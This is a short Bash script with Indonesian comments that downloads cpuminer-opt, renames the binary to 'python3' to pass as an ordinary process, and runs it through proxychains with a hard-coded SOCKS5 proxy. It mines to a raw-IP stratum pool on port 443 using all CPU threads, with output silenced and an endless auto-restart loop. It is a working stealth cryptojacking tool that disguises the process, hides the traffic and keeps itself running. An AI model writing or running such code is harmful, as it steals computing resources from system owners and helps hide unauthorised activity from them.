#!/bin/bash
set -e

# ====[ KONFIGURASI ]====
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzo"
POOL="stratum+tcp://159.223.48.143:443"
ALGO="power2b"
THREADS=$(nproc --all)
FAKE_NAME="python3"
CONFIG_PATH="./proxychains.conf"

# ====[ CEK DEPENDENSI ]====
command -v proxychains >/dev/null 2>&1 || {
    echo "[!] proxychains tidak ditemukan. Install dengan: apt install proxychains4 -y"
    exit 1
}

# Buat konfigurasi SOCKS5 lokal di direktori kerja
echo -e "[ProxyList]\nsocks5 101.38.175.192 8081" > "$CONFIG_PATH"
export PROXYCHAINS_CONF_FILE="$CONFIG_PATH"

# ====[ DOWNLOAD MINER ]====
if [ ! -f "$FAKE_NAME" ]; then
    wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$FAKE_NAME"
    chmod +x "$FAKE_NAME"
fi

# ====[ ANTI-DISMISS & AUTORESTART ]====
while true; do
    echo "[*] Menjalankan miner via proxychains..."
    proxychains ./"$FAKE_NAME" -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS > /dev/null 2>&1 &
    PID=$!

    while sleep 30; do
        if ! ps -p $PID > /dev/null; then
            echo "[!] Miner mati, restart ulang..."
            break
        fi
    done
done
